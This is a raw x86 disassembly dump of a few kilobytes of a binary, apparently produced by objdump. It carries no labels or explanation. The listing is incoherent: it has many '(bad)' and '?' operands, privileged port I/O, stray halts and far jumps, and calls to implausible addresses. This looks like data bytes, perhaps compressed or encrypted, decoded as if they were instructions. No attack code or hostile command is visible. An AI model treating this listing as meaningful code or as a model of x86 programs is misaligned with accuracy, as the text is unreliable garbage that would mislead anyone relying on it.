  44b247:	rol    BYTE PTR [edx-0x6037527a],cl
  44b24d:	adc    ch,cl
  44b24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b250:	addr16 imul eax,ecx,0xbacdd8e3
  44b257:	mov    ds:0x460e234d,al
  44b25c:	retf   
  44b25d:	push   esi
  44b25e:	fdiv   DWORD PTR [edx-0x4e7d5fd1]
  44b264:	rol    BYTE PTR [esp+ebx*8],0x69
  44b268:	mov    ah,0x42
  44b26a:	push   ebx
  44b26b:	sub    esp,DWORD PTR cs:[edi+eiz*8-0x5b]
  44b270:	imul   eax,DWORD PTR [edx-0x8],0x30
  44b274:	std    
  44b275:	cdq    
  44b276:	xor    cl,BYTE PTR [eax-0x7e]
  44b279:	jbe    0x44b28f
  44b27b:	mov    eax,0x48fac696
  44b280:	adc    eax,0x19860d75
  44b285:	fistp  WORD PTR [edx+0x45404eb0]
  44b28b:	mov    eax,0x240a6cf4
  44b290:	add    eax,0xbd81568
  44b295:	or     eax,0xde00d7d6
  44b29a:	cmc    
  44b29b:	call   0xbc4e0dac
  44b2a0:	mov    al,ds:0xb66db8b5
  44b2a5:	(bad)  
  44b2a6:	fld    TBYTE PTR [esp+eiz*4-0x6f4a241a]
  44b2ad:	or     DWORD PTR [edx],edi
  44b2af:	push   cs
  44b2b0:	push   edi
  44b2b1:	add    BYTE PTR [eax+0x62],ah
  44b2b4:	f2xm1  
  44b2b6:	and    bl,ah
  44b2b8:	xchg   DWORD PTR [eax+0x2c46a05c],edx
  44b2be:	push   esi
  44b2bf:	add    eax,0x968ab0a0
  44b2c4:	fcomp  QWORD PTR [edi+0x6648f68c]
  44b2ca:	inc    esi
  44b2cb:	xchg   edi,eax
  44b2cc:	xor    al,0x14
  44b2ce:	jmp    0x422f:0xc4c1c3cd
  44b2d5:	and    al,ch
  44b2d7:	imul   ebp,DWORD PTR [ecx],0xd01ea3eb
  44b2dd:	rcl    DWORD PTR [ebp-0x3dd3abe2],cl
  44b2e3:	pop    es
  44b2e4:	adc    al,bh
  44b2e6:	loopne 0x44b2b3
  44b2e8:	pop    ecx
  44b2e9:	loop   0x44b291
  44b2eb:	add    ebp,ecx
  44b2ed:	xor    eax,esi
  44b2ef:	dec    eax
  44b2f0:	fisubr WORD PTR [edx-0x80]
  44b2f3:	and    bh,ah
  44b2f5:	or     al,0x82
  44b2f7:	or     ebx,DWORD PTR [ecx]
  44b2f9:	fwait
  44b2fa:	cs dec esp
  44b2fc:	mov    cl,0x39
  44b2fe:	mov    ah,0xb4
  44b300:	sbb    BYTE PTR [eax-0x513d7613],ch
  44b306:	adc    edi,DWORD PTR [eax-0x11946592]
  44b30c:	loope  0x44b36b
  44b30e:	or     edx,edi
  44b310:	fimul  WORD PTR [eax+ebx*2-0x48]
  44b314:	jp     0x44b36e
  44b316:	sahf   
  44b317:	outs   dx,DWORD PTR ds:[esi]
  44b318:	or     BYTE PTR [edi],ch
  44b31a:	imul   ecx,DWORD PTR [ecx+edi*2],0x534e623a
  44b321:	xchg   esp,eax
  44b323:	ficomp WORD PTR [eax-0x41fba236]
  44b329:	dec    ecx
  44b32a:	push   ebp
  44b32b:	sbb    DWORD PTR [esi-0x2b365315],esi
  44b331:	pop    es
  44b332:	sbb    BYTE PTR [ebx+0x50338062],bh
  44b338:	pop    edi
  44b339:	jno    0x44b34a
  44b33b:	adc    al,dh
  44b33d:	mov    ch,al
  44b33f:	pusha  
  44b340:	dec    ebp
  44b341:	outs   dx,BYTE PTR ds:[esi]
  44b342:	nop
  44b343:	jnp    0x44b372
  44b345:	imul   ebp,DWORD PTR [ebx-0x4e],0x535a0a12
  44b34c:	dec    esp
  44b34d:	in     eax,0xb3
  44b34f:	sub    BYTE PTR [esi+0x7959602a],dh
  44b355:	call   0x15ed833e
  44b35a:	pop    eax
  44b35b:	push   edi
  44b35c:	ds out 0xfc,al
  44b35f:	dec    esi
  44b360:	(bad)  
  44b361:	xchg   ebx,eax
  44b362:	pusha  
  44b363:	jae    0x44b360
  44b365:	dec    ecx
  44b366:	dec    esp
  44b367:	push   ebx
  44b368:	fnstcw WORD PTR [eax-0x374affa1]
  44b36e:	jne    0x44b35d
  44b370:	add    ah,0x4b
  44b373:	fmul   QWORD PTR [ebx-0x47448bc9]
  44b379:	xchg   BYTE PTR [eax],dl
  44b37b:	clc    
  44b37c:	sub    al,0xb5
  44b37e:	xor    DWORD PTR [eax-0x15],ebx
  44b381:	sbb    al,BYTE PTR [edi]
  44b383:	stos   BYTE PTR es:[edi],al
  44b384:	mov    gs,WORD PTR [edx]
  44b386:	shl    DWORD PTR [edi+0x34],cl
  44b389:	add    al,0x85
  44b38b:	mov    dl,0xd8
  44b38d:	bound  edi,QWORD PTR [edx-0x79792657]
  44b393:	pop    ebx
  44b394:	clc    
  44b395:	cmp    BYTE PTR [edx-0x12],0xfd
  44b399:	sub    BYTE PTR fs:[ebx+ecx*2+0x22aa2658],ah
  44b3a1:	cdq    
  44b3a2:	(bad)  
  44b3a3:	cmc    
  44b3a4:	imul   BYTE PTR [ecx+0xb]
  44b3a7:	pop    ebx
  44b3a8:	xchg   esp,eax
  44b3a9:	call   0xb078d5f2
  44b3ae:	(bad)  
  44b3af:	adc    BYTE PTR [esi],dh
  44b3b1:	mov    ch,0x89
  44b3b3:	dec    edx
  44b3b4:	dec    edx
  44b3b5:	xor    al,0x68
  44b3b7:	test   eax,0x50e13362
  44b3bc:	nop
  44b3bd:	xchg   ebp,eax
  44b3be:	sahf   
  44b3bf:	mov    al,ds:0x432b1c69
  44b3c4:	aas    
  44b3c5:	inc    ecx
  44b3c6:	push   0x4
  44b3c8:	loop   0x44b38c
  44b3ca:	pop    ss
  44b3cb:	adc    al,0x9a
  44b3cd:	test   al,0x45
  44b3cf:	fisubr WORD PTR [edi]
  44b3d1:	mov    eax,0x9b4a2b7f
  44b3d6:	pop    ebx
  44b3d7:	fadd   st,st(4)
  44b3d9:	jne    0x44b3b2
  44b3db:	ret    0xf020
  44b3de:	add    eax,eax
  44b3e0:	cmp    eax,0x49d7c8d2
  44b3e5:	inc    ecx
  44b3e6:	add    eax,0xc0f6e44e
  44b3ec:	or     al,0xf2
  44b3ee:	jle    0x44b438
  44b3f0:	nop
  44b3f1:	dec    edx
  44b3f2:	inc    eax
  44b3f3:	xor    BYTE PTR [eax],ah
  44b3f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b3f6:	je     0x44b461
  44b3f8:	mov    al,ds:0xe292d35a
  44b3fd:	in     al,0x58
  44b3ff:	shr    eax,cl
  44b401:	add    BYTE PTR ds:0xa8eb169e,bl
  44b407:	cli    
  44b408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b409:	js     0x44b445
  44b40b:	push   ds
  44b40c:	imul   esi,DWORD PTR [eax],0xffffffbb
  44b40f:	mov    bl,bl
  44b411:	lock sub al,0x69
  44b414:	push   ds
  44b415:	inc    ebp
  44b416:	enter  0x26fd,0xa9
  44b41a:	sahf   
  44b41b:	pop    esi
  44b41c:	icebp  
  44b41d:	mov    al,0x71
  44b41f:	push   edx
  44b420:	or     bh,BYTE PTR [edx]
  44b422:	(bad)  
  44b423:	jge    0x44b3b5
  44b425:	sub    al,BYTE PTR [edx+0x68f40762]
  44b42b:	jl     0x44b453
  44b42d:	mov    al,BYTE PTR ds:0x203e1ad0
  44b433:	jnp    0x44b45a
  44b435:	jmp    0xac6f96d
  44b43a:	or     eax,0x74d4585b
  44b43f:	xchg   esi,eax
  44b440:	jmp    DWORD PTR [esi+0x19e732a4]
  44b446:	dec    ecx
  44b447:	ins    BYTE PTR es:[edi],dx
  44b448:	and    ah,cl
  44b44a:	sub    BYTE PTR [ebx+0x54],cl
  44b44d:	and    dh,al
  44b44f:	sub    al,0xd8
  44b451:	(bad)  
  44b452:	(bad)  
  44b453:	add    eax,0x527698f2
  44b458:	pop    eax
  44b459:	clc    
  44b45a:	dec    esp
  44b45b:	fldcw  WORD PTR [ebx]
  44b45d:	adc    al,dh
  44b45f:	pop    ecx
  44b460:	mov    ecx,0x10dfacbe
  44b465:	push   ecx
  44b466:	enter  0x34ef,0x40
  44b46a:	ins    BYTE PTR es:[edi],dx
  44b46b:	test   al,0x43
  44b46d:	les    esi,FWORD PTR [ebx]
  44b46f:	push   edx
  44b470:	aaa    
  44b471:	(bad)  
  44b472:	or     al,0x63
  44b474:	xchg   ecx,eax
  44b475:	clc    
  44b476:	and    eax,0xc2d72290
  44b47b:	push   ss
  44b47c:	cmp    BYTE PTR [esi-0x4b],dl
  44b47f:	retf   0xadd0
  44b482:	test   al,0xa0
  44b484:	mov    ?,WORD PTR [eax]
  44b486:	cld    
  44b487:	jg     0x44b458
  44b489:	das    
  44b48a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b48b:	iret   
  44b48c:	and    BYTE PTR [esi+edx*1-0x9376525],bl
  44b493:	fiadd  DWORD PTR [esi+0x8180347]
  44b499:	fiadd  DWORD PTR [edx]
  44b49b:	inc    edx
  44b49c:	and    al,BYTE PTR [edi+0x37]
  44b49f:	test   eax,0x8876a687
  44b4a4:	mov    dl,0xac
  44b4a6:	adc    ebx,eax
  44b4a8:	or     al,0xc2
  44b4aa:	and    eax,0x7b4e9460
  44b4af:	xchg   ebx,eax
  44b4b0:	rol    BYTE PTR [esi+0x3e7ec06b],cl
  44b4b6:	aam    0xad
  44b4b8:	or     DWORD PTR [edx+eiz*4],eax
  44b4bb:	loopne 0x44b47d
  44b4bd:	jecxz  0x44b4cb
  44b4bf:	mov    bl,0x52
  44b4c1:	jbe    0x44b52c
  44b4c3:	push   esp
  44b4c4:	test   eax,0x52ea162e
  44b4c9:	dec    esp
  44b4ca:	(bad)  
  44b4cb:	cmp    dh,BYTE PTR [eax+esi*8-0x17012b78]
  44b4d2:	cmp    DWORD PTR ss:[edi-0x787b717c],eax
  44b4d9:	sub    al,0x55
  44b4db:	sub    ch,BYTE PTR [ebp+ebp*1+0x15]
  44b4df:	aam    0xa
  44b4e1:	inc    ebp
  44b4e2:	jp     0x44b540
  44b4e4:	pop    eax
  44b4e5:	fmul   DWORD PTR [edx]
  44b4e7:	fwait
  44b4e8:	fs cmp eax,0x866cf981
  44b4ee:	add    ebx,DWORD PTR [edx]
  44b4f0:	adc    al,al
  44b4f2:	sub    edx,DWORD PTR [edx]
  44b4f4:	loopne 0x44b503
  44b4f6:	cmp    DWORD PTR [ebx-0x77],0x7dd41dad
  44b4fd:	retf   0xa6d9
  44b500:	or     cl,bl
  44b502:	inc    edx
  44b503:	test   DWORD PTR [ecx+0x3a],edx
  44b506:	add    eax,0xf584e6d
  44b50b:	pop    esi
  44b50c:	mov    esp,0x7edcbfc4
  44b511:	xchg   edx,eax
  44b512:	adc    BYTE PTR [ebp+0x108a7074],ch
  44b518:	add    eax,0x86fda344
  44b51d:	sub    DWORD PTR fs:[esi-0x48],ebp
  44b521:	loop   0x44b4d9
  44b523:	arpl   WORD PTR [edx-0x8],bx
  44b526:	out    0x85,al
  44b528:	adc    eax,DWORD PTR [eax-0x38]
  44b52b:	retf   0x9813
  44b52e:	push   0x1e121ae3
  44b533:	jns    0x44b542
  44b535:	iret   
  44b536:	xor    BYTE PTR [eax+0x70],dl
  44b539:	retf   
  44b53a:	nop
  44b53b:	mov    ebp,0xdb191f38
  44b540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b541:	test   BYTE PTR ds:0x27c49e5a,ch
  44b547:	arpl   WORD PTR [esi+0x4a],bx
  44b54a:	les    esp,FWORD PTR [edi]
  44b54c:	pusha  
  44b54d:	(bad)  [ebp-0x4775768]
  44b553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b554:	(bad)  
  44b555:	adc    al,BYTE PTR [eax-0x41]
  44b558:	out    dx,eax
  44b559:	clc    
  44b55a:	push   es
  44b55b:	mov    cl,0x22
  44b55d:	or     eax,0xad42c76c
  44b562:	jl     0x44b57f
  44b564:	push   ss
  44b565:	sbb    edi,esp
  44b567:	mov    ch,BYTE PTR [edi-0x16]
  44b56a:	xchg   ecx,eax
  44b56b:	lock pop es
  44b56d:	mov    ecx,0x41e2bca4
  44b572:	sbb    eax,0x32e1c053
  44b577:	xor    al,0xa8
  44b579:	in     al,dx
  44b57a:	xchg   edi,eax
  44b57b:	test   al,0x56
  44b57d:	jb     0x44b512
  44b57f:	les    esi,FWORD PTR [eax]
  44b581:	jbe    0x44b5ae
  44b583:	cli    
  44b584:	retf   0x1ed1
  44b587:	pop    edx
  44b588:	mov    ebx,DWORD PTR [eax+0x2538f5c5]
  44b58e:	jle    0x44b584
  44b590:	xchg   ecx,eax
  44b591:	gs stos BYTE PTR es:[edi],al
  44b593:	call   0x3d38d7b9
  44b598:	mov    dh,0xce
  44b59a:	fisubr DWORD PTR [edi+0x13]
  44b59d:	js     0x44b5f3
  44b59f:	xchg   ebx,eax
  44b5a0:	ret    0xf1d4
  44b5a3:	and    DWORD PTR [ebx+esi*2-0x57],0x321607b5
  44b5ab:	inc    edx
  44b5ac:	push   es
  44b5ad:	and    ch,BYTE PTR [edx]
  44b5af:	adc    BYTE PTR [edi+0x64],0xe1
  44b5b3:	jo     0x44b615
  44b5b5:	add    al,0x2d
  44b5b7:	in     al,dx
  44b5b8:	clc    
  44b5b9:	dec    ecx
  44b5ba:	in     al,dx
  44b5bb:	push   ecx
  44b5bc:	pop    eax
  44b5bd:	sub    BYTE PTR [ebx-0x7c],bl
  44b5c0:	lock xchg esp,eax
  44b5c2:	call   DWORD PTR [edx+0x41e3a2b0]
  44b5c8:	int3   
  44b5c9:	test   DWORD PTR [ecx+ecx*1-0x3bd684ba],0x4a1638aa
  44b5d4:	pop    ss
  44b5d5:	cli    
  44b5d6:	ins    DWORD PTR es:[edi],dx
  44b5d7:	and    al,0x6f
  44b5d9:	push   ecx
  44b5da:	xchg   ebp,eax
  44b5db:	xor    al,BYTE PTR [esi-0x1]
  44b5de:	xor    al,BYTE PTR [edx-0x93d3dc2]
  44b5e4:	sub    esi,DWORD PTR [eax]
  44b5e6:	fwait
  44b5e7:	es data16 aas 
  44b5ea:	or     DWORD PTR [esp+edx*2],edi
  44b5ed:	dec    edx
  44b5ee:	and    BYTE PTR ss:[eax+0x54642217],al
  44b5f5:	adc    eax,0x75a9d915
  44b5fa:	jbe    0x44b5fe
  44b5fc:	nop    ebp
  44b5ff:	push   ds
  44b600:	mov    ds:0xd5d899d2,al
  44b605:	jns    0x44b605
  44b607:	and    eax,0x11d408e4
  44b60c:	mov    al,0xc9
  44b60e:	sub    al,0xe4
  44b610:	push   edx
  44b611:	jl     0x44b645
  44b613:	clc    
  44b614:	add    al,0x1
  44b616:	popf   
  44b617:	js     0x44b673
  44b619:	sbb    al,0xb0
  44b61b:	jmp    0xfd60:0x416bd458
  44b622:	mov    fs,WORD PTR [edx+ebp*8]
  44b625:	xchg   ecx,eax
  44b626:	icebp  
  44b627:	pop    esp
  44b628:	sub    eax,DWORD PTR [esi-0x1710c7ea]
  44b62e:	or     ebx,DWORD PTR [eax+0x71]
  44b631:	jl     0x44b5e5
  44b633:	mov    dl,0x3e
  44b635:	add    eax,0x866c016
  44b63a:	int    0x6c
  44b63c:	pop    esi
  44b63d:	pop    eax
  44b63e:	int3   
  44b63f:	jl     0x44b604
  44b641:	daa    
  44b642:	or     BYTE PTR [esi+esi*2-0x1fd5d65a],dh
  44b649:	repnz clc 
  44b64b:	ins    DWORD PTR es:[edi],dx
  44b64c:	arpl   WORD PTR [ebx-0x75],dx
  44b64f:	cli    
  44b650:	sub    BYTE PTR [ecx],ch
  44b652:	sub    bl,BYTE PTR [eax+ebx*2-0x76e1eff1]
  44b659:	push   esi
  44b65a:	cdq    
  44b65b:	jb     0x44b685
  44b65d:	icebp  
  44b65e:	cs pusha 
  44b660:	ins    DWORD PTR es:[edi],dx
  44b661:	push   0x17b079e2
  44b666:	not    edx
  44b668:	pop    edx
  44b669:	mov    cl,BYTE PTR [ebp+edx*2+0x22]
  44b66d:	dec    eax
  44b66e:	cmp    dh,ch
  44b670:	fisub  DWORD PTR [edx]
  44b672:	xor    bh,bl
  44b674:	and    DWORD PTR [edx-0x3b63334],eax
  44b67a:	add    BYTE PTR [ebp+eax*4+0x6a8a35a9],dh
  44b681:	mov    al,0x43
  44b683:	(bad)  
  44b684:	aas    
  44b685:	cmp    bh,al
  44b687:	and    al,0xb0
  44b689:	sar    BYTE PTR [esp+esi*1-0x582dffd0],0xd2
  44b691:	pop    ecx
  44b692:	push   edx
  44b693:	inc    ebx
  44b694:	imul   eax,DWORD PTR [ecx],0xffffff8f
  44b697:	pusha  
  44b698:	pop    eax
  44b699:	std    
  44b69a:	jp     0x44b65e
  44b69c:	or     eax,edx
  44b69e:	sub    esp,DWORD PTR [ebx-0x17]
  44b6a1:	data16 aam 0x51
  44b6a4:	in     eax,0x60
  44b6a6:	loop   0x44b64d
  44b6a8:	push   ds
  44b6a9:	adc    BYTE PTR [esi-0x3ae5d3b8],0xc2
  44b6b0:	ror    BYTE PTR [ecx-0x12f48106],1
  44b6b6:	xchg   esi,eax
  44b6b7:	or     DWORD PTR [ebp+0xd],ebp
  44b6ba:	mov    dh,0xd8
  44b6bc:	fiadd  DWORD PTR [edi+0x3a]
  44b6bf:	(bad)  
  44b6c0:	mov    ebx,0xc32174d0
  44b6c5:	push   esp
  44b6c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b6c7:	scas   al,BYTE PTR es:[edi]
  44b6c8:	push   ss
  44b6c9:	mov    cl,0xa6
  44b6cb:	mov    ds:0xf0a1e8a9,al
  44b6d0:	mov    ah,0x77
  44b6d2:	idiv   BYTE PTR [edx-0x5a]
  44b6d5:	repz mov esp,0x7a0178e9
  44b6db:	add    al,0xc6
  44b6dd:	mov    esp,0x2201a078
  44b6e2:	push   ss
  44b6e3:	rol    esi,1
  44b6e5:	dec    esi
  44b6e6:	hlt    
  44b6e7:	or     DWORD PTR [ebp+0x46a2e1a2],ebp
  44b6ed:	xchg   BYTE PTR [eax-0xbb93cf0],bl
  44b6f3:	push   ecx
  44b6f4:	icebp  
  44b6f5:	lods   al,BYTE PTR ds:[esi]
  44b6f6:	push   cs
  44b6f7:	fdivr  QWORD PTR [ebx]
  44b6f9:	mov    WORD PTR [esi-0x292614e4],cs
  44b6ff:	sub    bl,bl
  44b701:	test   BYTE PTR [edi-0x61],0xee
  44b705:	rcr    BYTE PTR [ebx],0x57
  44b708:	test   edi,ecx
  44b70a:	adc    dh,cl
  44b70c:	shl    BYTE PTR [ebx],1
  44b70e:	test   eax,0x784b67bc
  44b713:	inc    eax
  44b714:	jecxz  0x44b6ab
  44b716:	jp     0x44b71a
  44b718:	imul   BYTE PTR [eax]
  44b71a:	out    0x8b,eax
  44b71c:	inc    eax
  44b71d:	ret    
  44b71e:	bndldx bnd3,[esi-0x432b458e]
  44b725:	push   edx
  44b726:	and    ah,al
  44b728:	leave  
  44b729:	retf   0x22a5
  44b72c:	loopne 0x44b73f
  44b72e:	or     DWORD PTR [edx+eiz*8-0x4b],edx
  44b732:	mov    dh,0xe2
  44b734:	push   eax
  44b735:	jp     0x44b77c
  44b737:	arpl   WORD PTR [ebp-0x37f89f4],ax
  44b73d:	mov    dl,0x11
  44b73f:	dec    edi
  44b740:	push   es
  44b741:	rcr    BYTE PTR [esi],1
  44b743:	pop    ebx
  44b744:	inc    eax
  44b745:	(bad)  
  44b746:	loope  0x44b770
  44b748:	aam    0xfd
  44b74a:	adc    DWORD PTR es:[edi],0x3c6ef1ec
  44b751:	mov    edi,0x8e349409
  44b756:	ins    DWORD PTR es:[edi],dx
  44b757:	xchg   bh,dl
  44b759:	js     0x44b785
  44b75b:	nop
  44b75c:	in     al,0x80
  44b75e:	inc    eax
  44b75f:	rcr    BYTE PTR [esi],0x16
  44b762:	push   ss
  44b763:	pop    esp
  44b764:	add    BYTE PTR [esi-0x2],cl
  44b767:	and    al,0xf3
  44b769:	mov    edi,0x97a903e1
  44b76e:	mov    ds,WORD PTR [edi-0x6821e1cb]
  44b774:	and    DWORD PTR [ebx-0x35579b7],esp
  44b77a:	ret    
  44b77b:	icebp  
  44b77c:	or     eax,DWORD PTR [edx+0x7b]
  44b77f:	mov    edx,0xf87c58b8
  44b784:	mov    esi,0x82349832
  44b789:	jp     0x44b731
  44b78b:	in     al,0x15
  44b78d:	pusha  
  44b78e:	stos   DWORD PTR es:[edi],eax
  44b78f:	mov    ds:0x3234705a,eax
  44b794:	(bad)  
  44b795:	test   BYTE PTR [esi+0x1208d134],0x7e
  44b79c:	xchg   esp,eax
  44b79d:	jbe    0x44b7fc
  44b79f:	ja     0x44b7de
  44b7a1:	test   BYTE PTR [eax],0x7c
  44b7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b7a5:	mov    dl,0xaa
  44b7a7:	(bad)  [eax-0x7]
  44b7aa:	and    cl,ch
  44b7ac:	pop    ebx
  44b7ad:	add    eax,0xe79844a4
  44b7b2:	inc    esi
  44b7b3:	push   eax
  44b7b4:	add    BYTE PTR [edx-0x53],ah
  44b7b7:	mov    ebp,0x1167d2d9
  44b7bc:	mov    al,0xc9
  44b7be:	jno    0x44b7c7
  44b7c0:	cmp    eax,0xbf0cf002
  44b7c5:	retf   0x6020
  44b7c8:	aas    
  44b7c9:	push   esi
  44b7ca:	scas   eax,DWORD PTR es:[edi]
  44b7cb:	sub    DWORD PTR [esp+esi*4],ebx
  44b7ce:	inc    esi
  44b7cf:	mov    ?,WORD PTR [edi-0x70]
  44b7d2:	(bad)  
  44b7d3:	out    dx,al
  44b7d4:	(bad)  
  44b7d6:	fidiv  DWORD PTR [edi]
  44b7d8:	pop    esi
  44b7d9:	adc    BYTE PTR [esi-0x32],bl
  44b7dc:	cmp    DWORD PTR [ebp+eiz*8-0x28931ff6],edx
  44b7e3:	ret    0x46d6
  44b7e6:	adc    esi,DWORD PTR [edx-0x250d55d7]
  44b7ec:	sbb    al,0x3f
  44b7ee:	sub    al,0x84
  44b7f0:	push   ss
  44b7f1:	(bad)  
  44b7f2:	and    BYTE PTR [edx],bh
  44b7f4:	cmp    esp,edx
  44b7f6:	sub    DWORD PTR [ebp+0x210ac647],eax
  44b7fc:	test   al,0xd6
  44b7fe:	test   BYTE PTR [edx-0x253cb9c0],bl
  44b804:	mov    esi,0x9850bc88
  44b809:	sub    bl,bl
  44b80b:	jae    0x44b84e
  44b80d:	mov    cl,0x18
  44b80f:	(bad)  
  44b810:	cs sub al,0x17
  44b813:	pop    ecx
  44b814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b815:	lods   al,BYTE PTR ds:[esi]
  44b816:	js     0x44b84e
  44b818:	mov    ch,0xe6
  44b81a:	mov    edx,gs
  44b81c:	stos   BYTE PTR es:[edi],al
  44b81d:	and    al,0x76
  44b81f:	adc    eax,0x29be3743
  44b824:	xor    al,0x2
  44b826:	pop    ebp
  44b827:	or     al,0x50
  44b829:	lods   al,BYTE PTR ds:[esi]
  44b82a:	pop    ebp
  44b82b:	inc    edx
  44b82c:	les    eax,FWORD PTR [esi]
  44b82e:	aam    0xd8
  44b830:	mov    ebp,0xd611c22a
  44b835:	push   0xa5970a2
  44b83a:	(bad)  
  44b83b:	mov    BYTE PTR [esp+edx*8-0x5955ef58],dh
  44b842:	in     al,0x2c
  44b844:	sbb    ah,BYTE PTR [eax]
  44b846:	pop    edx
  44b847:	mov    eax,ds:0x410f2230
  44b84c:	add    cl,ah
  44b84e:	add    ebp,DWORD PTR [ebx-0x2b7c7e4a]
  44b854:	cmp    BYTE PTR [edi-0x2a2fa4de],ah
  44b85a:	pop    edx
  44b85b:	cmp    ah,BYTE PTR [esi-0x55c78f21]
  44b861:	xor    esi,esi
  44b863:	out    0xd3,eax
  44b865:	xor    al,0x5b
  44b867:	push   0x2a
  44b869:	pop    edx
  44b86a:	xchg   edi,eax
  44b86b:	xchg   esp,eax
  44b86c:	bound  edi,QWORD PTR [esi-0x5f07f3e0]
  44b872:	aam    0x3e
  44b874:	jle    0x44b804
  44b876:	pop    es
  44b877:	push   0x78
  44b879:	xchg   edx,eax
  44b87a:	rol    BYTE PTR [ecx+0x34],1
  44b87d:	shr    dl,cl
  44b87f:	sbb    BYTE PTR [esi+0xa6f8f4e],dh
  44b885:	(bad)  [ebx-0x2d471ee0]
  44b88b:	outs   dx,DWORD PTR ds:[esi]
  44b88c:	mov    bl,BYTE PTR [ebx-0x53]
  44b88f:	test   eax,0x949275a1
  44b894:	lods   eax,DWORD PTR ds:[esi]
  44b895:	add    al,0x59
  44b897:	mov    gs,WORD PTR [ebp*4-0x594d85b0]
  44b89e:	int3   
  44b89f:	push   esp
  44b8a0:	mov    ah,0xc8
  44b8a2:	fmul   DWORD PTR [edx+edx*4]
  44b8a5:	sbb    bh,BYTE PTR [eax+0xf43db80]
  44b8ab:	add    BYTE PTR [esi+0x0],bl
  44b8ae:	inc    ebp
  44b8af:	push   ebp
  44b8b0:	sbb    bh,al
  44b8b2:	in     eax,dx
  44b8b3:	daa    
  44b8b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b8b5:	sub    ah,al
  44b8b7:	setle  BYTE PTR [ebp+0x4081ca69]
  44b8be:	js     0x44b8e9
  44b8c0:	or     ah,BYTE PTR [eax]
  44b8c2:	aam    0xb7
  44b8c4:	mov    cl,0xa9
  44b8c6:	(bad)  [edi-0x7e]
  44b8c9:	pushf  
  44b8ca:	int    0x6a
  44b8cc:	out    dx,al
  44b8cd:	xchg   ecx,eax
  44b8ce:	call   0xace65c69
  44b8d3:	dec    ebp
  44b8d4:	int    0x66
  44b8d6:	cs cwde 
  44b8d8:	sub    BYTE PTR [ecx-0x2f],ah
  44b8db:	add    al,al
  44b8dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b8de:	data16 (bad) [edi]
  44b8e1:	retf   0xd6db
  44b8e4:	mov    dl,0x88
  44b8e6:	jb     0x44b8f2
  44b8e8:	sub    eax,0x1e221f14
  44b8ed:	sbb    dh,dl
  44b8ef:	mov    BYTE PTR [ebx],ch
  44b8f1:	ror    BYTE PTR [ebp+0x5e],0xe1
  44b8f5:	xchg   edi,eax
  44b8f6:	test   eax,0x71ec627d
  44b8fb:	xor    BYTE PTR [ebx+ebx*1-0x77afdf33],0x38
  44b903:	fs or  al,0x58
  44b907:	sub    bh,BYTE PTR fs:[eax]
  44b90a:	add    al,BYTE PTR [ecx+ebx*8-0x1dbd4662]
  44b911:	stos   DWORD PTR es:[edi],eax
  44b912:	retf   0xda50
  44b915:	hlt    
  44b916:	or     BYTE PTR [esi+edi*2],ch
  44b919:	fwait
  44b91a:	jp     0x44b91c
  44b91c:	loopne 0x44b96f
  44b91e:	iret   
  44b91f:	div    ch
  44b921:	cmp    ebp,esp
  44b923:	js     0x44b947
  44b925:	shr    DWORD PTR [esi+edx*1-0xd6f24d0],1
  44b92c:	jnp    0x44b949
  44b92e:	aam    0x23
  44b930:	sub    eax,0x4978aabe
  44b935:	popa   
  44b936:	xchg   ebx,eax
  44b937:	pusha  
  44b938:	push   ss
  44b939:	fisub  DWORD PTR [ebp+0x47086856]
  44b93f:	cmp    BYTE PTR [esi-0x40],0x6
  44b943:	ins    BYTE PTR es:[edi],dx
  44b944:	repz sbb al,0xc4
  44b947:	or     BYTE PTR [ebp+0x30],bl
  44b94a:	inc    edx
  44b94b:	xor    al,0x48
  44b94d:	jo     0x44b9cd
  44b94f:	push   ecx
  44b950:	clc    
  44b951:	push   0x6ef8fb42
  44b956:	rol    BYTE PTR [edi+0x249bf1b6],1
  44b95c:	hlt    
  44b95d:	mov    al,0x23
  44b95f:	ss dec ebp
  44b961:	stos   DWORD PTR es:[edi],eax
  44b962:	cli    
  44b963:	jb     0x44b8ff
  44b965:	dec    eax
  44b966:	or     al,0xa
  44b968:	mov    ?,WORD PTR [eax]
  44b96a:	mov    ds:0xdbf4a442,al
  44b96f:	adc    dl,dl
  44b971:	pop    edi
  44b972:	dec    edx
  44b973:	rcl    BYTE PTR [ebx],cl
  44b975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b976:	dec    edi
  44b977:	test   BYTE PTR ds:0x5b3e44b3,dh
  44b97d:	lea    edx,[ecx+ecx*8+0x294bbc7a]
  44b984:	test   eax,0x22ac7801
  44b989:	into   
  44b98a:	inc    ebp
  44b98b:	sbb    eax,0x6402496a
  44b990:	dec    esi
  44b991:	fs mov dh,0xe6
  44b994:	sub    ecx,DWORD PTR [esi]
  44b996:	and    al,0x6c
  44b998:	push   edx
  44b999:	pusha  
  44b99a:	pop    ebx
  44b99b:	pop    eax
  44b99c:	jl     0x44b9a8
  44b99e:	(bad)  
  44b99f:	shl    DWORD PTR [esi+esi*2+0x77e4185c],1
  44b9a6:	pop    edx
  44b9a7:	stc    
  44b9a8:	daa    
  44b9a9:	jge    0x44b9d1
  44b9ab:	sbb    BYTE PTR [edi],0xc0
  44b9ae:	std    
  44b9af:	retf   
  44b9b0:	add    DWORD PTR cs:[edi+0x99ea0aa],esp
  44b9b7:	in     al,dx
  44b9b8:	add    eax,0x24bd4930
  44b9bd:	jle    0x44ba12
  44b9bf:	push   esi
  44b9c0:	mov    esi,DWORD PTR [ebp+0x32]
  44b9c3:	(bad)  
  44b9c4:	popa   
  44b9c5:	dec    ecx
  44b9c6:	jp     0x44b9f5
  44b9c8:	test   eax,0xc29af7dc
  44b9cd:	cmp    esp,esi
  44b9cf:	cmp    BYTE PTR [eax],ah
  44b9d1:	jle    0x44ba2f
  44b9d3:	ficom  WORD PTR ds:0x5fbaeae4
  44b9d9:	add    dh,BYTE PTR [esi+0x64a02656]
  44b9df:	cmp    al,0x58
